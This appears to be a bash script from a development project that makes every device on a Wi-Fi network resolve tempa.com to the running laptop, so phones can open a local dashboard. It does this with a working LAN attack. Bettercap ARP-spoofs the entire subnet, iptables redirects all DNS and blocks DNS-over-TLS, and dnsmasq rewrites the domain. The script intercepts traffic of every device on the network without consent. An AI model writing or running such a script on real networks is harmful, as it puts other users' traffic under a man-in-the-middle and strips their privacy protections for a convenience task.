#!/usr/bin/env bash
# Same-WiFi override: every device on this LAN resolves tempa.com → this laptop.
# No phone/router settings. Keep this machine awake on Wi‑Fi while it's running.
set -euo pipefail

if [[ "${EUID}" -ne 0 ]]; then
  exec sudo -E "$0" "$@"
fi

ACTION="${1:-start}"
STATE_DIR=/run/tempa-lan
PIDFILE="${STATE_DIR}/bettercap.pid"
LOGFILE=/var/log/tempa-lan-hijack.log

WIFI_IF=$(ip -4 route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
WIFI_IP=$(ip -4 route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1); exit}}')
GATEWAY=$(ip -4 route show default | awk '{print $3; exit}')
# resolvectl prints: "Link 2 (wlan0): 192.168.1.1" — use last field
UPSTREAM_DNS=$(resolvectl dns "${WIFI_IF}" 2>/dev/null | awk '{print $NF; exit}')
if [[ -z "${UPSTREAM_DNS}" || ! "${UPSTREAM_DNS}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  UPSTREAM_DNS="${GATEWAY:-1.1.1.1}"
fi

if [[ -z "${WIFI_IP}" || -z "${WIFI_IF}" || -z "${GATEWAY}" ]]; then
  echo "Could not detect Wi‑Fi / gateway" >&2
  exit 1
fi

SUBNET=$(ip -4 route show dev "${WIFI_IF}" | awk '/proto kernel/ {print $1; exit}')
SUBNET="${SUBNET:-${WIFI_IP%.*}.0/24}"

setup_dnsmasq() {
  apt-get install -y dnsmasq bettercap iptables >/dev/null

  # Laptop itself still uses hosts → localhost
  sed -i -E '/(^|[[:space:]])tempa\.com([[:space:]]|$)/d' /etc/hosts
  echo "127.0.0.1 tempa.com www.tempa.com" >> /etc/hosts

  mkdir -p /etc/dnsmasq.d
  cat > /etc/dnsmasq.d/tempa-lan.conf <<EOF
# Serve LAN clients the laptop Wi‑Fi IP (never /etc/hosts → 127.0.0.1)
bind-interfaces
interface=${WIFI_IF}
listen-address=${WIFI_IP}
no-dhcp-interface=${WIFI_IF}
no-hosts
domain-needed
bogus-priv
no-resolv
server=${UPSTREAM_DNS}
address=/tempa.com/${WIFI_IP}
address=/www.tempa.com/${WIFI_IP}
EOF

  if [[ -f /etc/default/dnsmasq ]]; then
    sed -i 's/^ENABLED=0/ENABLED=1/' /etc/default/dnsmasq || true
  fi
  systemctl enable dnsmasq >/dev/null 2>&1 || true
  systemctl restart dnsmasq

  echo "dnsmasq: tempa.com → ${WIFI_IP} (upstream ${UPSTREAM_DNS})"
  dig +short tempa.com @"${WIFI_IP}" | grep -q "${WIFI_IP}" \
    || { echo "dnsmasq not answering ${WIFI_IP} for tempa.com" >&2; exit 1; }
}

ensure_apache_http() {
  CERT_DIR=/etc/ssl/tempa-local
  if [[ ! -f "${CERT_DIR}/tempa.com.crt" ]]; then
    echo "Missing ${CERT_DIR}/tempa.com.crt — run ./scripts/setup-tempa-com-local.sh first" >&2
    exit 1
  fi
  a2enmod ssl proxy proxy_http proxy_wstunnel headers rewrite >/dev/null
  cat > /etc/apache2/sites-available/tempa.conf <<EOF
<VirtualHost *:80>
	ServerName tempa.com
	ServerAlias www.tempa.com
	ProxyPreserveHost On
	ProxyRequests Off
	RewriteEngine On
	RewriteCond %{HTTP:Upgrade} =websocket [NC]
	RewriteRule /(.*)           ws://127.0.0.1:8787/\$1 [P,L]
	ProxyPass        / http://127.0.0.1:8787/
	ProxyPassReverse / http://127.0.0.1:8787/
</VirtualHost>
<VirtualHost *:443>
	ServerName tempa.com
	ServerAlias www.tempa.com
	SSLEngine on
	SSLCertificateFile ${CERT_DIR}/tempa.com.crt
	SSLCertificateKeyFile ${CERT_DIR}/tempa.com.key
	ProxyPreserveHost On
	ProxyRequests Off
	RewriteEngine On
	RewriteCond %{HTTP:Upgrade} =websocket [NC]
	RewriteRule /(.*)           ws://127.0.0.1:8787/\$1 [P,L]
	ProxyPass        / http://127.0.0.1:8787/
	ProxyPassReverse / http://127.0.0.1:8787/
</VirtualHost>
EOF
  a2ensite tempa.conf >/dev/null
  apache2ctl configtest >/dev/null
  systemctl reload apache2
}

add_iptables() {
  # Catch DNS that flows through us after ARP spoof; push phones off Private DNS (DoT)
  iptables -t nat -C PREROUTING -i "${WIFI_IF}" -p udp --dport 53 -j REDIRECT --to-ports 53 2>/dev/null \
    || iptables -t nat -A PREROUTING -i "${WIFI_IF}" -p udp --dport 53 -j REDIRECT --to-ports 53
  iptables -t nat -C PREROUTING -i "${WIFI_IF}" -p tcp --dport 53 -j REDIRECT --to-ports 53 2>/dev/null \
    || iptables -t nat -A PREROUTING -i "${WIFI_IF}" -p tcp --dport 53 -j REDIRECT --to-ports 53
  iptables -C FORWARD -i "${WIFI_IF}" -p tcp --dport 853 -j REJECT 2>/dev/null \
    || iptables -A FORWARD -i "${WIFI_IF}" -p tcp --dport 853 -j REJECT
  iptables -t nat -C POSTROUTING -o "${WIFI_IF}" -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -o "${WIFI_IF}" -j MASQUERADE
}

clear_iptables() {
  iptables -t nat -D PREROUTING -i "${WIFI_IF}" -p udp --dport 53 -j REDIRECT --to-ports 53 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "${WIFI_IF}" -p tcp --dport 53 -j REDIRECT --to-ports 53 2>/dev/null || true
  iptables -D FORWARD -i "${WIFI_IF}" -p tcp --dport 853 -j REJECT 2>/dev/null || true
  iptables -t nat -D POSTROUTING -o "${WIFI_IF}" -j MASQUERADE 2>/dev/null || true
}

start_hijack() {
  setup_dnsmasq
  ensure_apache_http
  mkdir -p "${STATE_DIR}"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null
  add_iptables

  if [[ -f "${PIDFILE}" ]] && kill -0 "$(cat "${PIDFILE}")" 2>/dev/null; then
    echo "Already running (pid $(cat "${PIDFILE}"))"
    exit 0
  fi

  # ARP-MITM so this laptop sees DNS; only tempa.com is rewritten (via dnsmasq redirect)
  nohup bettercap -iface "${WIFI_IF}" -silent -eval "
set arp.spoof.fullduplex true;
set arp.spoof.internal true;
set arp.spoof.targets ${SUBNET};
arp.spoof on;
" >"${LOGFILE}" 2>&1 &
  echo $! >"${PIDFILE}"
  sleep 1
  if ! kill -0 "$(cat "${PIDFILE}")" 2>/dev/null; then
    echo "bettercap failed to start — see ${LOGFILE}" >&2
    clear_iptables
    exit 1
  fi

  echo
  echo "LAN override ON for ${SUBNET}"
  echo "  tempa.com → ${WIFI_IP} (Tempa dashboard)"
  echo "  Leave this laptop awake on Wi‑Fi."
  echo "  On phones open:  http://tempa.com"
  echo "  Stop later with: ./scripts/tempa-lan-hijack.sh stop"
}

stop_hijack() {
  if [[ -f "${PIDFILE}" ]]; then
    kill "$(cat "${PIDFILE}")" 2>/dev/null || true
    rm -f "${PIDFILE}"
  fi
  pkill -f "bettercap -iface ${WIFI_IF}" 2>/dev/null || true
  clear_iptables
  echo "LAN override OFF (ARP/DNS hijack stopped)."
  echo "Internet for other devices should recover in a few seconds."
}

status_hijack() {
  if [[ -f "${PIDFILE}" ]] && kill -0 "$(cat "${PIDFILE}")" 2>/dev/null; then
    echo "running pid=$(cat "${PIDFILE}") if=${WIFI_IF} ip=${WIFI_IP}"
    dig +short tempa.com @"${WIFI_IP}" || true
  else
    echo "stopped"
  fi
}

case "${ACTION}" in
  start) start_hijack ;;
  stop) stop_hijack ;;
  status) status_hijack ;;
  *)
    echo "Usage: $0 {start|stop|status}" >&2
    exit 1
    ;;
esac
